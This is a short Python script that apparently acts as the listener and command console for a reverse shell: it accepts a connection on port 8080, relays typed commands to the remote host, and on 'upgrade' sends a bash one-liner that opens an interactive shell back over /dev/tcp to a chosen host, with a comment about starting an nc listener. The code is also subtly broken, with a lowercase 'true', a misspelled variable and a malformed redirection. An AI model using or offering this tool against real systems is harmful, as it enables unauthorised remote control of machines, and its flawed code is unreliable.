import socket
sock=socket.socket ()
sock.bind (("0.0.0.0",8080))
sock.listen (5)
conn,addr=sock.accept ()
def recv ():
    global conn
    while true:
       responce=conn.recv (2048)
       if responce!=b'':
          print (responce.decode("ascii"))
__import__('threading').Thread (target=recv).start ()
while 1:  
   print (" Hit Crtl+D to send!")
   cmd=__import__('sys').stdin.read ()
   conn.send (bytes(cmd,"utf-8"))
   if cmd=="upgrade":
       #open another terminal and type $nc -l host port
       cmd="bash -c \"bash -i >&/dev/tcp/"+input ('lhost>')+"/"+input ("port")+" 0>&1 &1"
       conn.send (str.encode(cmd))
     
